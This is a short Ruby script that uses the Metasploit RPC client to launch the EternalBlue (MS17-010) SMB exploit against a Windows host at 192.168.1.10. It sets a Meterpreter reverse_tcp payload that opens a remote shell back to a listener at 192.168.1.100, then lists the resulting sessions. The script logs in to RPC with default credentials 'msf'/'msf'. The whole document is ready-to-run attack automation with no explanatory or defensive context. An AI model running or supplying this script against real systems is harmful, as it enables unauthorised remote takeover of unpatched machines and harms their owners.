require 'msfrpc-client'

client = Msf::RPC::Client.new(host: '127.0.0.1', port: 55553, user: 'msf', pass: 'msf')

client.auth.login

exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
exploit['RHOSTS'] = '192.168.1.10'
exploit['PAYLOAD'] = 'windows/x64/meterpreter/reverse_tcp'
exploit['LHOST'] = '192.168.1.100'

job_id = exploit.execute

puts "Exploit job started with ID #{job_id}"

sessions = client.sessions.list
sessions.each do |id, session|
  puts "Session ID: #{id}, Type: #{session['type']}, Information: #{session['info']}"
end
